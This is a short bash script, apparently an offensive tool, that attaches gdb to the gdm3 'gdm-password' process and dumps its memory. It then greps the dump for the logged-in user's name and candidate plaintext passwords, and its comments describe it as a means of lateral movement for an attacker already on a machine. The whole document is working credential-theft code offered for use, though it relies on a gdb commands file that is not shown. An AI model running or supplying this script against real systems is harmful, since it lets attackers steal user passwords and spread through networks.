#!/bin/bash
  
# gdm3 3.26.2.1-3 (and possibly later) stores the credentials of the logged on user in plaintext in memory.
# Useful for lateral movement; we're on a box, but we don't yet have any credentials...
# This script requires root or privileged access to gdb/gcore/ptrace, etc.

cat << "EOF"
          __                                               __ 
.-----.--|  |.--------.-----.---.-.-----.-----.--.--.--.--|  |
|  _  |  _  ||        |  _  |  _  |__ --|__ --|  |  |  |  _  |
|___  |_____||__|__|__|   __|___._|_____|_____|________|_____|
|_____| @secure_mode  |__|                                    
                
EOF

# check ptrace_scope

ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)

if [ "$ptrace_scope" -eq "3" ]; then
        echo -e "\nUse of ptrace appears to be restricted due to /proc/sys/kernel/yama/ptrace_scope being set to $ptrace_scope. This won't work.";
        exit 1;
fi

gdb=$(which gdb)
strings=$(which strings)
commands="commands.txt"
gdmpassword_pid=$(ps aux |grep 'gdm-password' |grep -v grep |awk '{print $2}')

$gdb -p $gdmpassword_pid -x $commands --batch-silent 2>/dev/null
$strings /tmp/core_file > /tmp/core_strings

account=$(grep 'HOME=' /tmp/core_strings |cut -f2 -d"/")
password=$(grep -E -C2 "myhostname|protocols" /tmp/core_strings |grep -v '\-\-')

echo -e 'USERNAME:' $account '\n\nPASSWORD CANDIDATES:\n' 
echo $password\ | tr " " "\n"
rm /tmp/core_strings && rm /tmp/core_file
